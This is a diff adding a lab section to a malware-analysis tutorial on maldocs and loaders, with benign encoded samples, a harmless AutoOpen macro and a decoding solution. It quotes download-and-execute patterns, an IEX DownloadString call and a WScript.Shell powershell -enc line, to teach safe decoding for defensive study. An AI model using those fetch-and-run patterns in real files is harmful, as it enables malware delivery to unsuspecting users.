@@ -1,5 +1,8 @@
 ---
 title: "Lesson 19.3: Analyzing maldocs and loaders, where the attack begins"
+image:
+  path: /assets/img/covers/re-19-3-analyzing-maldocs-loaders-where-attack-begins.webp
+  alt: "Lesson 19.3: Analyzing maldocs and loaders, where the attack begins"
 date: 2023-10-27 16:21:00 +0700
 categories: ["Technique Reverse", "Part 19 · Malware Analysis Basics"]
 tags: [reverse-engineering, malware]
@@ -93,6 +96,83 @@ Lab `19.3` has benign sample strings for you to practice exactly these two patte
 ```
 
 What you're hunting at the end of the chain is the payload download URL and how it runs that payload. Having these two is enough to block and trace, you don't need to touch the next-stage payload yet.
+
+## Lab
+
+The goal of this lab is to practice stripping away a loader's obfuscation without ever executing it. Every sample here is harmless (it only prints text), but the point is to build the right habit: decode and read, never run. You need Python 3, and optionally `pip install oletools` if you want to try `olevba` on a macro. If you later move on to a real sample, do it in an isolated lab as covered in Lesson 0.3.
+
+There are four files. `stage1_encoded.txt` holds a string shaped like a `powershell -EncodedCommand` argument (base64 over UTF-16LE). `stage2_gzip_b64.txt` holds a base64-wrapped-around-gzip pattern, the kind a multi-stage loader uses. `benign_macro.vba` is a harmless macro that mimics the structure of a real maldoc (an AutoOpen trigger, a string split into pieces). `decode_layers.py` is a reference script that decodes both encoded strings (it only prints, it never executes anything).
+
+Start with `stage1_encoded.txt`. It is the argument that would follow `-enc`. Decode it by hand: base64 decode it, then decode the result as UTF-16LE. What is the real command? Then ask why you decode as UTF-16LE rather than UTF-8, and try decoding as UTF-8 to see what goes wrong.
+
+Next open `stage2_gzip_b64.txt` and recognize the gzip magic (`1f 8b`) once you base64 decode it, then finish decoding with gzip to get the command. Read `benign_macro.vba` and point out which part is the auto-exec trigger, which part is the string split apart to hide it, and where in a real maldoc the payload-downloading command would sit. If you have oletools installed, put this macro into an Office file (or use a known-safe sample) and run `olevba` to see how it flags AutoOpen. Finally check your work against the reference script by running `decode_layers.py`.
+
+Two questions to think about. If you came across `IEX (New-Object Net.WebClient).DownloadString('http://...')`, what would you replace `IEX` with to get the content of the next stage without running it? And why do loaders like to nest several layers of encoding instead of using just one? Try it yourself before opening the solution.
+
+<div class="lab-box">
+<div class="lab-head"><b>LAB 19.3</b>source files</div>
+<div class="lab-files">
+<a class="lab-file" href="/assets/labs/19.3/src/benign_macro.vba" download><i class="fa-solid fa-file-code"></i>src/benign_macro.vba</a>
+<a class="lab-file" href="/assets/labs/19.3/src/decode_layers.py" download><i class="fa-solid fa-file-code"></i>src/decode_layers.py</a>
+<a class="lab-file" href="/assets/labs/19.3/src/stage1_encoded.txt" download><i class="fa-solid fa-file-lines"></i>src/stage1_encoded.txt</a>
+<a class="lab-file" href="/assets/labs/19.3/src/stage2_gzip_b64.txt" download><i class="fa-solid fa-file-lines"></i>src/stage2_gzip_b64.txt</a>
+</div>
+</div>
+
+<details class="lab-solution" markdown="1">
+<summary>Show solution</summary>
+
+To decode the first stage:
+
+```python
+import base64
+enc = "VwByAGkAdABlAC0ASABvAHMAdAAg...ACcA"   # see stage1_encoded.txt
+print(base64.b64decode(enc).decode("utf-16-le"))
+```
+
+The result is this.
+
+```
+Write-Host 'Hello from a benign decoded payload'
+```
+
+The real command just prints a line of text. In a real maldoc, this spot would instead hold a call to `DownloadString` or `DownloadFile`.
+
+On why UTF-16LE, PowerShell's `-EncodedCommand` specifies that the string is UTF-16LE before it gets base64 encoded. If you decode it as UTF-8 instead, every ASCII character is interleaved with a `00` byte, so you get a string with scattered spaces like `W r i t e - H o s t`. Seeing that "letters glued to null bytes" pattern is the sign that you need to switch to UTF-16LE.
+
+For the second stage, base64 decoding `stage2_gzip_b64.txt` gives a result whose first two bytes are `1f 8b`, the gzip magic. Finishing the decode:
+
+```python
+import base64, gzip
+print(gzip.decompress(base64.b64decode(b64)).decode())
+```
+
+The result is this.
+
+```
+Write-Host 'Stage 2 reached, still benign'
+```
+
+Reading the macro in `benign_macro.vba`, the auto-exec trigger is `Sub AutoOpen()` (and `Document_Open`), which runs as soon as the file is opened, with no user click needed, and olevba always flags these functions as AutoExec. The hidden string is `a = "Hel" & "lo" & Chr(32) & "Ana" & "lyst"`, pieces joined together with `Chr(32)` standing in for a space to dodge a plain grep, which reassembles into `Hello Analyst`. The spot that would hold the payload in a real maldoc is marked by a comment, where you would expect something like `CreateObject("WScript.Shell").Run "powershell -enc ..."`. The lab leaves it blank on purpose, for safety.
+
+With oletools installed, running `olevba benign.doc` lists the macros and marks the Type column as `AutoExec` for `AutoOpen` and `Document_Open`, with the Keyword column flagging `Chr` and `MsgBox`. On a real maldoc it would also flag `Shell`, `Run`, `powershell`, and extract any base64 string it recognizes.
+
+Checking everything with the reference script gives this.
+
+```
+$ python3 decode_layers.py
+[Stage 1: base64 UTF-16LE]
+  -> Write-Host 'Hello from a benign decoded payload'
+
+[Stage 2: base64 + gzip]
+  -> Write-Host 'Stage 2 reached, still benign'
+
+Both are harmless commands that only print text.
+```
+
+On the questions, you would replace `IEX` (or `Invoke-Expression`, or `.Invoke()`) with `Write-Output` (or copy the string over to Python and `print` it). That way the next stage gets printed instead of executed, and you can read the URL or payload without getting infected. Loaders nest several layers because each layer gets past one layer of detection (an antivirus scanning strings, an EDR scanning commands), and it costs an analyst more effort to peel through. For us it is just the same decode step repeated until the layers run out.
+
+</details>
 
 ## Key takeaways
 A loader (maldoc, LNK or script) differs from a payload: it only pulls the payload down, and taking it apart stops things at the root. For macros, extract with olevba and look for AutoOpen/Document_Open, obfuscated strings and Shell/Run. For PDFs, use pdf-parser or peepdf, inspect /OpenAction, /JS and /Launch, and decode FlateDecode streams. For LNKs, read the arguments with lnkparse, since the real command is hidden there.
